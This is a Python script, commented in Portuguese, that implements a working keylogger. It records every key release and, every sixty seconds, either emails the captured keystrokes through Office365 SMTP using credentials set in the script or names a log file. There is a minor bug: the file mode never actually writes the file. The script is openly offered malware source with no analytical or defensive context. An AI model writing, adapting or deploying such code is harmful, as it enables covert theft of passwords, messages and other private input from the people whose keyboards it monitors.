#!/usr/bin/env python3bom
import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


enviar_dados_cada = 60 # A cada 60 segundos log sera enviado
Email = 'email@email.com' # Email a ser recebido log
senha = 'senha_do_email' # Senha do email a ser recebido o log

class Keylogger:
    def __init__(self, intervalo, metodo="Email"):
        self.intervalo = intervalo
        self.metodo = metodo
        
        # Aonde sera armazenado os dados
        self.log = ''
        # Inicio e fim de armazenamento
        self.iniciar_dt = datetime.now()
        self.fim_dt = datetime.now()

    def callback(self, event):
        ''' Funcao chamada toda vez que uma
             tecla for pressionada'''

        name = event.name
        if len(name) > 1:
            # Caso a tecla seja uma caracter especial
            if name == "space":
                # Caso tecla seja espaço
                name = ' '

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = '.'

            else:
                name = name.replace(' ', "_")
                name = f"[{name.upper()}]"

        self.log += name

    # Criação de arquivo com LOG

    def atualizar_arquivo(self):
        iniciar_dt = str(self.iniciar_dt)[:-7].replace(" ", '-').replace(":", "")
        fim_dt = str(self.fim_dt)[:-7].replace(" ", "-").replace(":", "")
        self.arquivolog = f"Keylogger -> {iniciar_dt}_{fim_dt}" 

    def criar_arquivo(self):
        with open(f'{self.arquivolog}.txt', "w") as f:
            print(self.log, file=f)
        print(f"[+] Salvo {self.arquivolog}.txt")

    def prepare_mail(self, message):
        '''Funcao que constroi um html e uma versao txt para enviar ao email'''

        msg = MIMEMultipart("alternative")
        msg["From"] = Email
        msg["To"] = Email
        msg["Subject"] = "Keylogger LOGS"

        html = f'<p>{message}</p>'
        text_parte = MIMEText(message, 'plain')
        html_parte = MIMEText(html, "html")
        msg.attach(text_parte)
        msg.attach(html_parte)

        return msg.as_string()

    def enviar_email(self, email, senha, message, verbose=1):
        ''' Conecta a SMTP LOGA no EMAIL, e envia a si mesmo o email
        com log do keylogger'''
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, senha)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f'{datetime.now()} - Email enviado a {email} contendo {message}')

    def reportar(self):
        if self.log:
            # Verifica se tem algo no log
            self.fim_dt = datetime.now()
            # Atualiza arquivo
            self.atualizar_arquivo()
            if self.metodo == "Email":
                self.enviar_email(Email, senha, self.log)
            elif self.metodo == "file":
                self.atualizar_arquivo()
            print(f'[{self.arquivolog}] - {self.log}')
            self.iniciar_dt = datetime.now()
        self.log = ''
        timer = Timer(interval=self.intervalo, function=self.reportar)
        timer.daemon = True
        timer.start()

    def start(self):
        self.iniciar_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.reportar()
        print(f'{datetime.now()} - Keylogger iniciado')
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(intervalo=enviar_dados_cada, metodo="file")
    keylogger.start()
